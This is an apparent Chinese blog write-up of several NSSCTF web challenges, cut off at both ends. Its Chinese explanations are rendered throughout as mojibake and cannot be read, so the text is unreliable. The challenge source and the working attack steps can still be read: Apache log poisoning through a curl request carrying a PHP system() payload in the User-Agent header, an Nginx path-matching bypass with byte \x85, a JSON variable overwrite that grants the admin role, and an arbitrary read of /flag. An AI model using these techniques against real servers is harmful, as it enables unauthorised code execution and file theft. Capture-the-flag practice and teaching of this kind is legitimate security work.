class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|filter|base64|text|read|resource|\=|\&#x27;|\&quot;|\,/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ªåè®®éƒ½ç”¨ä¸äº†æœ‰wafï¼Œé‚£å°±æ—¥å¿—åŒ…å«ï¼ŒapacheæœåŠ¡å™¨</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/log/apache/access.logä¹‹å‰ä¸€ç›´ä»¥ä¸ºæ˜¯è¿™ä¸ªï¼Œä½†æ˜¯æŸ¥äº†ä¸€ä¸‹ç°åœ¨ä¸æ˜¯äº†</span><br><span class="line">/var/log/apache2/access.logæ˜¯è¿™ä¸ªï¼Œç›´æ¥æ‰“å°±è¡Œäº†</span><br><span class="line">curl -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; &quot;http://node10.anna.nssctf.cn:22383/leeevvvel2222222.php&quot;</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;4c29beda-b185-46bc-9fb2-efccf4b193b9&#125;</span><br></pre></td></tr></table></figure><h2 id="çœ¼è§ä¸ä¸€å®šä¸ºå®"><a href="#çœ¼è§ä¸ä¸€å®šä¸ºå®" class="headerlink" title="çœ¼è§ä¸ä¸€å®šä¸ºå®"></a>çœ¼è§ä¸ä¸€å®šä¸ºå®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">&quot;templates&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/secret&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;NSSCTF&#123;default&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>ç›´æ¥è®¿é—®403ç¦æ­¢çœ‹ä¸‹é¢˜ç›®</p><p><img src="/images/achieve/2025/11/2.png"></p><p>Nginx å’Œ Python å¯¹ URL è·¯å¾„çš„è§£ææ–¹å¼å¯èƒ½ä¸åŒï¼Œæ„æ€å°±æ˜¯è®©æˆ‘ä»¬å¼„ä¸ªè·¯å¾„Nginxä¸èƒ½è§£ææˆ&#x2F;secretï¼Œä½†æ˜¯pythonå¯ä»¥è§£ææˆ&#x2F;secret</p><p>ä¸Šç½‘æŸ¥äº†ä¸€ä¸‹è¿˜çœŸæœ‰<a href="https://xz.aliyun.com/news/18629">Nginx è·¯å¾„ç»•è¿‡-å…ˆçŸ¥ç¤¾åŒº</a></p><p>nginx.config</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server<span class="built_in">_</span>name  localhost;</span><br><span class="line"></span><br><span class="line">    location ~* <span class="built_in">^</span>/secret/?<span class="built_in">$</span> &#123;</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~* <span class="built_in">^</span>/secret/ &#123;</span><br><span class="line">        deny all;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy<span class="built_in">_</span>pass http://127.0.0.1:8080;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header Host <span class="built_in">$</span>host;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Real-IP <span class="built_in">$</span>remote<span class="built_in">_</span>addr;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Forwarded-For <span class="built_in">$</span>proxy<span class="built_in">_</span>add<span class="built_in">_</span>x<span class="built_in">_</span>forwarded<span class="built_in">_</span>for;</span><br><span class="line">        proxy<span class="built_in">_</span>set<span class="built_in">_</span>header X-Forwarded-Proto <span class="built_in">$</span>scheme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nginx é…ç½®çš„æ ¸å¿ƒè®¿é—®æ§åˆ¶éƒ¨åˆ†ï¼Œæˆ‘ä»¬çœ‹çœ‹å®ƒæ˜¯æ€ä¹ˆå¤„ç†çš„å¯ä»¥çœ‹åˆ°å®ƒç”¨æ­£åˆ™åŒ¹é…äº†æ‰€æœ‰çš„&#x2F;secretåé¢åŠ æˆ–è€…ä¸åŠ ä»»ä½•ä¸œè¥¿ï¼Œä½†æ˜¯ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦åŒ¹é…ä¸åˆ°ï¼Œæ¯”å¦‚ä¸å¯è§å­—ç¬¦\x85</p><p><img src="/images/achieve/2025/11/3.png"></p><p>æ”¹æˆ85å‘åŒ…å³å¯ï¼</p><h2 id="ez-file"><a href="#ez-file" class="headerlink" title="ez_file"></a>ez_file</h2><p>å¼€å±€å°±ç™»å½•é¡µé¢ï¼Œæ‰«å‡ºä¸ª&#x2F;<a href="http://www.zip/">www.zip</a></p><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#æ‚„æ‚„çš„ï¼Œæ ¡å†…èµ›é“ç¬¬ä¸€ä¸ªæ‰¾åˆ°å­¦é•¿çš„ç§˜å¯†çš„ç§ä¿¡å­¦é•¿ç§˜å¯†å†…å®¹ç»™å¥¶èŒ¶å–</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#header(&#x27;Content-Type: application/json&#x27;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$params</span> = [];</span><br><span class="line"><span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line"><span class="variable">$admin_role</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>] , <span class="string">&quot;application/json&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$raw</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">json_last_error</span>() === JSON_ERROR_NONE) &#123;</span><br><span class="line">        <span class="variable">$params</span> = <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invalid JSON&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¦‚æœæ˜¯æ™®é€šè¡¨å•è¯·æ±‚</span></span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ;</span><br><span class="line"><span class="comment">//    $params = [&#x27;username&#x27; =&gt; $username, &#x27;password&#x27; =&gt; $password];</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Unsupported request method&quot;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;456789&quot;</span> &amp;&amp; <span class="variable">$client_ip</span> === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$admin_role</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>,</span><br><span class="line">        <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Login successful (local admin)&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span> =&gt; <span class="variable">$client_ip</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;guest&quot;</span> &amp;&amp; <span class="variable">$password</span> === <span class="string">&quot;123456&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$role</span>;</span><br><span class="line">    <span class="comment">#echo $role;</span></span><br><span class="line">    <span class="comment">#echo json_encode([&quot;status&quot; =&gt; &quot;success&quot;, &quot;message&quot; =&gt; &quot;Login successful&quot;, &quot;user&quot; =&gt; $username]);</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;status&quot;</span> =&gt; <span class="string">&quot;failed&quot;</span>, <span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Invalid username or password&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è‚¯å®šæ˜¯æƒ³æ³•å­ç™»å½•è¿›å»<code>$client_ip = $_SERVER[&#39;REMOTE_ADDR&#39;]</code>è¿™ç©æ„è·å–ç”¨æˆ·ipåœ°å€ï¼Œå³ä½¿çŸ¥é“è´¦å·å¯†ç ä¹Ÿç™»å½•ä¸è¿›å»ï¼ç„¶åæ™®é€šç”¨æˆ·ç™»å½•ç»™æˆ‘è·³å›æ¥äº†ï¼Œç›´æ¥çœ‹index.phpæœç„¶æ˜¯<code>$_SESSION[&#39;role&#39;]</code></p><p>é‚£ä¸å°±æ­£å¥½ç”¨ä¸Šäº†ç¬¬ä¸€ä¸ªifè¿›è¡Œå˜é‡è¦†ç›–äº†å—ï¼Œç›´æ¥ä¸€æ¬¡æ€§è¦†ç›–ä¸‰ä¸ªå˜é‡</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;123456&quot;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ç™»å½•ä¸Šå»äº†</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret</span> = <span class="title function_ invoke__">rtrim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/secret&quot;</span>), <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>] !== <span class="variable">$secret</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.html&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$fileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">mime_content_type</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file too large&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#æ–‡ä»¶åç¼€ç™½åå•æ£€æµ‹ï¼Œæˆ‘å°±ä¸ä¿¡ä½ è¿˜èƒ½ä¸Šä¼ phpæ–‡ä»¶ï¼Œå˜»å˜»å˜»</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileType</span>, [<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;file type not allow&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./uploads/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload to ./uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$black_list</span>=[<span class="string">&quot;php&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;pht&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>], PATHINFO_EXTENSION));</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$name</span>,<span class="variable">$black_list</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸æƒ³çœ‹åˆ°phpæ–‡ä»¶&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æ€ä¹ˆæ²¡æœ‰ä¸œè¥¿ï¼Œè¿™æˆ‘æ”¹ä»€ä¹ˆ&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">tmpfile</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">fflush</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>],<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ–‡ä»¶é‡å‘½åæˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">files</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">        $<span class="title">files</span> = <span class="title">scandir</span>(&quot;./<span class="title">uploads</span>/&quot;);</span></span><br><span class="line"><span class="class">        <span class="title">foreach</span> ($<span class="title">files</span> <span class="title">as</span> $<span class="title">file</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&quot;.&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;./uploads/&#x27;</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;a href=<span class="string">&quot;./uploads/&lt;?=<span class="subst">$file</span>?&gt;&quot;</span>&gt;<span class="meta">&lt;?=</span><span class="variable">$file</span><span class="meta">?&gt;</span>&lt;/a&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> &#125;&#125;&#125; <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘æŠŠæ— å…³ç´§è¦çš„htmléƒ¨åˆ†ç»™åˆ äº†ï¼</p><p>å…ˆçœ‹ç¬¬ä¸€ä¸ªphpå—ï¼Œå°±æ˜¯ä¸€ä¸ªåªèƒ½ä¸Šä¼ å›¾ç‰‡çš„ç™½åå•æ£€æµ‹</p><p>ç¬¬äºŒä¸ªphpå—å…³é”®éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;old_name&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;new_name&#x27;</span>],<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>å®ƒä¼šå°†è¯»åˆ°çš„æ–‡ä»¶å†™å…¥æ–°çš„æ–‡ä»¶åï¼Œé‚£ä¸å°±ç›´æ¥ä»»æ„æ–‡ä»¶è¯»å–äº†å˜›xd</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?old<span class="built_in">_</span>name=/flag<span class="built_in">&amp;</span>new<span class="built_in">_</span>name=rufeii</span><br><span class="line">NSSCTF&#123;77e17714-ce59-431d-b605-0db30f8bbb50&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-include-revenge"><a href="#ez-include-revenge" class="headerlink" title="ez_include_revenge"></a>ez_include_revenge</h2><p>å‰é¢é‚£é“é¢˜çš„åŠ å¼ºç‰ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">stream_wrapper_unregister</span>(<span class="string">&#x27;php&#x27;</span>);   <span class="comment">//ç¦ç”¨phpæµå°è£…åè®®</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;no_hl&#x27;</span>])) <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$dir</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ 